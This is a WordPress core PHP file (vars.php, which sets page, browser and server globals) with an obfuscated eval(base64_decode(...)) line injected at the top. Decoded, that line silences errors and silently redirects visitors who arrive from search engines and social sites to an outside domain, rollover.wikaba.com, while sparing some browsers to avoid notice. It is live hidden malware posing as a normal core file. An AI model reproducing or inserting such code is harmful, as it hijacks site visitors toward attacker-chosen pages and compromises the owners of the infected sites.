<?php	 	eval(base64_decode("DQplcnJvcl9yZXBvcnRpbmcoMCk7DQokcWF6cGxtPWhlYWRlcnNfc2VudCgpOw0KaWYgKCEkcWF6cGxtKXsNCiRyZWZlcmVyPSRfU0VSVkVSWydIVFRQX1JFRkVSRVInXTsNCiR1YWc9JF9TRVJWRVJbJ0hUVFBfVVNFUl9BR0VOVCddOw0KaWYgKCR1YWcpIHsNCmlmICghc3RyaXN0cigkdWFnLCJNU0lFIDcuMCIpKXsKaWYgKHN0cmlzdHIoJHJlZmVyZXIsInlhaG9vIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYmluZyIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsInJhbWJsZXIiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJnb2dvIikgb3Igc3RyaXN0cigkcmVmZXJlciwibGl2ZS5jb20iKW9yIHN0cmlzdHIoJHJlZmVyZXIsImFwb3J0Iikgb3Igc3RyaXN0cigkcmVmZXJlciwibmlnbWEiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJ3ZWJhbHRhIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYmVndW4ucnUiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJzdHVtYmxldXBvbi5jb20iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJiaXQubHkiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJ0aW55dXJsLmNvbSIpIG9yIHByZWdfbWF0Y2goIi95YW5kZXhcLnJ1XC95YW5kc2VhcmNoXD8oLio/KVwmbHJcPS8iLCRyZWZlcmVyKSBvciBwcmVnX21hdGNoICgiL2dvb2dsZVwuKC4qPylcL3VybFw/c2EvIiwkcmVmZXJlcikgb3Igc3RyaXN0cigkcmVmZXJlciwibXlzcGFjZS5jb20iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJmYWNlYm9vay5jb20iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJhb2wuY29tIikpIHsNCmlmICghc3RyaXN0cigkcmVmZXJlciwiY2FjaGUiKSBvciAhc3RyaXN0cigkcmVmZXJlciwiaW51cmwiKSl7DQpoZWFkZXIoIkxvY2F0aW9uOiBodHRwOi8vcm9sbG92ZXIud2lrYWJhLmNvbS8iKTsNCmV4aXQoKTsNCn0KfQp9DQp9DQp9"));
/**
 * Creates common globals for the rest of WordPress
 *
 * Sets $pagenow global which is the current page. Checks
 * for the browser to set which one is currently being used.
 *
 * Detects which user environment WordPress is being used on.
 * Only attempts to check for Apache and IIS. Two web servers
 * with known permalink capability.
 *
 * @package WordPress
 */

// On which page are we ?
if ( is_admin() ) {
	// wp-admin pages are checked more carefully
	preg_match('#/wp-admin/?(.*?)$#i', $PHP_SELF, $self_matches);
	$pagenow = $self_matches[1];
	$pagenow = trim($pagenow, '/');
	$pagenow = preg_replace('#\?.*?$#', '', $pagenow);
	if ( '' === $pagenow || 'index' === $pagenow || 'index.php' === $pagenow ) {
		$pagenow = 'index.php';
	} else {
		preg_match('#(.*?)(/|$)#', $pagenow, $self_matches);
		$pagenow = strtolower($self_matches[1]);
		if ( '.php' !== substr($pagenow, -4, 4) )
			$pagenow .= '.php'; // for Options +Multiviews: /wp-admin/themes/index.php (themes.php is queried)
	}
} else {
	if ( preg_match('#([^/]+\.php)([?/].*?)?$#i', $PHP_SELF, $self_matches) )
		$pagenow = strtolower($self_matches[1]);
	else
		$pagenow = 'index.php';
}

// Simple browser detection
$is_lynx = $is_gecko = $is_winIE = $is_macIE = $is_opera = $is_NS4 = $is_safari = $is_chrome = $is_iphone = false;

if ( isset($_SERVER['HTTP_USER_AGENT']) ) {
	if ( strpos($_SERVER['HTTP_USER_AGENT'], 'Lynx') !== false ) {
		$is_lynx = true;
	} elseif ( strpos(strtolower($_SERVER['HTTP_USER_AGENT']), 'chrome') !== false ) {
		$is_chrome = true;
	} elseif ( strpos(strtolower($_SERVER['HTTP_USER_AGENT']), 'safari') !== false ) {
		$is_safari = true;
	} elseif ( strpos($_SERVER['HTTP_USER_AGENT'], 'Gecko') !== false ) {
		$is_gecko = true;
	} elseif ( strpos($_SERVER['HTTP_USER_AGENT'], 'MSIE') !== false && strpos($_SERVER['HTTP_USER_AGENT'], 'Win') !== false ) {
		$is_winIE = true;
	} elseif ( strpos($_SERVER['HTTP_USER_AGENT'], 'MSIE') !== false && strpos($_SERVER['HTTP_USER_AGENT'], 'Mac') !== false ) {
		$is_macIE = true;
	} elseif ( strpos($_SERVER['HTTP_USER_AGENT'], 'Opera') !== false ) {
		$is_opera = true;
	} elseif ( strpos($_SERVER['HTTP_USER_AGENT'], 'Nav') !== false && strpos($_SERVER['HTTP_USER_AGENT'], 'Mozilla/4.') !== false ) {
		$is_NS4 = true;
	}
}

if ( $is_safari && strpos(strtolower($_SERVER['HTTP_USER_AGENT']), 'mobile') !== false )
	$is_iphone = true;

$is_IE = ( $is_macIE || $is_winIE );

// Server detection

/**
 * Whether the server software is Apache or something else
 * @global bool $is_apache
 */
$is_apache = (strpos($_SERVER['SERVER_SOFTWARE'], 'Apache') !== false || strpos($_SERVER['SERVER_SOFTWARE'], 'LiteSpeed') !== false);

/**
 * Whether the server software is IIS or something else
 * @global bool $is_IIS
 */
$is_IIS = (strpos($_SERVER['SERVER_SOFTWARE'], 'Microsoft-IIS') !== false || strpos($_SERVER['SERVER_SOFTWARE'], 'ExpressionDevServer') !== false);

/**
 * Whether the server software is IIS 7.X
 * @global bool $is_iis7
 */
$is_iis7 = (strpos($_SERVER['SERVER_SOFTWARE'], 'Microsoft-IIS/7.') !== false);


?>